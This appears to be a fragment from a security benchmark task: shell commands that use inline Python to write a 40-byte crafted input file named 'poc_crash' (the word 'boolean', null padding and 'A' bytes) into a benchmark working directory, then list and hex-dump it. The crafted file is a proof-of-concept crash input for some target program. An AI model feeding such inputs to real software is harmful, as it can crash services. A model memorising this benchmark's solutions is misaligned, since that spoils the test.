python3 -c "
import sys
data = b'boolean'.ljust(15, b'\x00') + b'\x00'*15 + b'A'*10
assert len(data) == 40
sys.stdout.buffer.write(data)
" > /CybinGym_workdir/poc_crash
ls -l /CybinGym_workdir/poc_crash; xxd /CybinGym_workdir/poc_crash
